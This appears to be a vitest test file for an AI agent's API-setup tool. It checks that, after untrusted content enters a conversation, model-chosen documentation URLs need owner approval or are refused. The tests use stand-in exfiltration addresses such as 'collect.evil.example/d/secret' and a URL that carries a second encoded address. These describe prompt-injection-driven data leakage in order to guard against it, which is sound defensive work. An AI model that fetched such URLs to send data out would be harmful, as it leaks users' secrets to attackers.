import { describe, it, expect, vi } from 'vitest';
import type { ToolEntry, PromptMeta, PromptText } from '../../types/index.js';

/**
 * `api_setup` bootstrap once foreign content is in the conversation: the page it reads first (the
 * docs page, else the spec) goes through the same origin check as an `http_request` GET. The model
 * chose that address, and its path and host name can carry data. The declarations under test are
 * the tool's own (`apiSetupTool`); only its handler is replaced, so no request leaves the test.
 */

vi.mock('@anthropic-ai/sdk', () => {
  class MockAnthropic { beta = { messages: { stream: vi.fn() } }; }
  class APIError extends Error {}
  return { default: MockAnthropic, APIError };
});
vi.mock('../../core/stream.js', () => ({ StreamProcessor: vi.fn() }));

import { Agent } from '../../core/agent.js';
import { OwnerKnownTargets } from '../../core/owner-known-targets.js';
import { ConversationLatch } from '../../core/conversation-latch.js';
import { flattenPrompt } from '../../core/prompt-value.js';
import { apiSetupTool } from './api-setup.js';

type Result = { content: unknown; is_error?: boolean };
type Exec = { _executeOneInner(tc: unknown): Promise<Result> };
type Input = { action: string; openapi_url?: string; docs_url?: string };

function apiSetup(): ToolEntry & { read: string[] } {
  const read: string[] = [];
  return {
    ...(apiSetupTool as unknown as ToolEntry),
    read,
    handler: async (input: Input) => { read.push(input.docs_url || input.openapi_url || input.action); return 'ok'; },
  } as unknown as ToolEntry & { read: string[] };
}

function asker(answer: string): { fn: (q: string | PromptText, o?: string[], m?: PromptMeta) => Promise<string>; asked: string[] } {
  const asked: string[] = [];
  return { asked, fn: async (q) => { asked.push(flattenPrompt(q)); return answer; } };
}

type Extra = Partial<ConstructorParameters<typeof Agent>[0]>;

function agentOf(tool: ToolEntry, promptUser: ((q: string | PromptText) => Promise<string>) | undefined, ownerText = 'nothing named', tainted = true, extra: Extra = {}): Agent {
  const agent = new Agent({
    name: 'a', model: 'claude-sonnet-4-6', provider: 'anthropic', noticeLanguage: 'en',
    tools: [tool], promptUser,
    ownerKnown: OwnerKnownTargets.of({ ownerTexts: () => [ownerText] }),
    conversationLatch: ConversationLatch.detached(),
    ...extra,
  } as ConstructorParameters<typeof Agent>[0]);
  if (tainted) agent.restoreConversationTaint();
  return agent;
}

const call = (agent: Agent, input: Input): Promise<Result> =>
  (agent as unknown as Exec)._executeOneInner({ type: 'tool_use', id: `s${Math.random()}`, name: 'api_setup', input });

describe('api_setup bootstrap after foreign content', () => {
  for (const field of ['openapi_url', 'docs_url'] as const) {
    it(`a ${field} with data in the path is asked about as a read, and not read without a yes`, async () => {
      const tool = apiSetup();
      const ask = asker('deny');
      const agent = agentOf(tool, ask.fn);
      const result = await call(agent, { action: 'bootstrap', [field]: 'https://collect.evil.example/d/secret' });
      expect(ask.asked).toHaveLength(1);
      expect(ask.asked[0]).toMatch(/^Read the page on "collect\.evil\.example"\? /);
      expect(tool.read).toEqual([]);
      expect(String(result.content)).toMatch(/^Not read: /);
    });

    it(`CONTROL: a ${field} of a host the owner named is read without a question`, async () => {
      const tool = apiSetup();
      const ask = asker('deny');
      const agent = agentOf(tool, ask.fn, 'the docs are on api.example.ch');
      await call(agent, { action: 'bootstrap', [field]: 'https://api.example.ch/openapi.json' });
      expect(ask.asked).toEqual([]);
      expect(tool.read).toEqual(['https://api.example.ch/openapi.json']);
    });
  }

  it('a yes reads the page', async () => {
    const tool = apiSetup();
    const ask = asker('allow');
    const agent = agentOf(tool, ask.fn);
    await call(agent, { action: 'bootstrap', openapi_url: 'https://collect.evil.example/d/secret' });
    expect(ask.asked).toHaveLength(1);
    expect(tool.read).toEqual(['https://collect.evil.example/d/secret']);
  });

  it('CONTROL: without foreign content before it, the same bootstrap is not asked about', async () => {
    const tool = apiSetup();
    const ask = asker('deny');
    const agent = agentOf(tool, ask.fn, 'nothing named', false);
    await call(agent, { action: 'bootstrap', openapi_url: 'https://collect.evil.example/d/secret' });
    expect(ask.asked).toEqual([]);
    expect(tool.read).toEqual(['https://collect.evil.example/d/secret']);
  });

  it('the docs page is the page checked when both addresses are given, as the handler reads it', async () => {
    const tool = apiSetup();
    const ask = asker('deny');
    // The owner named the spec's host, not the docs page's: the docs page is what is read.
    const agent = agentOf(tool, ask.fn, 'the spec is on api.example.ch');
    await call(agent, { action: 'bootstrap', openapi_url: 'https://api.example.ch/openapi.json', docs_url: 'https://collect.evil.example/d/secret' });
    expect(ask.asked).toHaveLength(1);
    expect(ask.asked[0]).toContain('"collect.evil.example"');
    expect(tool.read).toEqual([]);
  });

  it('a session of someone the owner let in is refused, not asked', async () => {
    const tool = apiSetup();
    const ask = asker('allow');
    const agent = agentOf(tool, ask.fn, 'nothing named', true, { principal: { kind: 'mandate', email: 'helper@example.ch' } } as Extra);
    const result = await call(agent, { action: 'bootstrap', openapi_url: 'https://collect.evil.example/d/secret' });
    expect(ask.asked).toEqual([]);
    expect(tool.read).toEqual([]);
    expect(result.is_error).toBe(true);
  });

  it('a run nobody can be asked in (a trigger) is refused, and nothing is read', async () => {
    const tool = apiSetup();
    const agent = agentOf(tool, undefined, 'nothing named', false, { autonomy: 'autonomous', sendOrigin: { kind: 'trigger', name: 'Neue API' } } as Extra);
    agent.noteUntrustedData();
    const result = await call(agent, { action: 'bootstrap', openapi_url: 'https://collect.evil.example/d/secret' });
    expect(tool.read).toEqual([]);
    expect(String(result.content)).toMatch(/^Not read: /);
    expect(String(result.content)).toContain('the owner did not name "collect.evil.example"');
  });

  it('a page a search listed is read without a question', async () => {
    const tool = apiSetup();
    const ask = asker('deny');
    const agent = agentOf(tool, ask.fn);
    agent.searchResultAddresses.noteResults('weather api', ['https://docs.listed.example/openapi.json']);
    await call(agent, { action: 'bootstrap', openapi_url: 'https://docs.listed.example/openapi.json' });
    expect(ask.asked).toEqual([]);
    expect(tool.read).toEqual(['https://docs.listed.example/openapi.json']);
  });

  it('an address that carries another address is asked about, even on a host the owner named', async () => {
    const tool = apiSetup();
    const ask = asker('deny');
    const agent = agentOf(tool, ask.fn, 'the docs are on api.example.ch');
    await call(agent, { action: 'bootstrap', docs_url: 'https://api.example.ch/fetch?u=https%3A%2F%2Fcollect.evil.example%2Fd' });
    expect(ask.asked).toHaveLength(1);
    expect(ask.asked[0]).toContain('carries another address');
    expect(tool.read).toEqual([]);
  });

  it('CONTROL: list and view read no page and are not asked about', async () => {
    const tool = apiSetup();
    const ask = asker('deny');
    const agent = agentOf(tool, ask.fn);
    await call(agent, { action: 'list' });
    await call(agent, { action: 'view', openapi_url: 'https://collect.evil.example/d/secret' } as Input);
    expect(ask.asked).toEqual([]);
    expect(tool.read).toEqual(['list', 'https://collect.evil.example/d/secret']);
  });
});
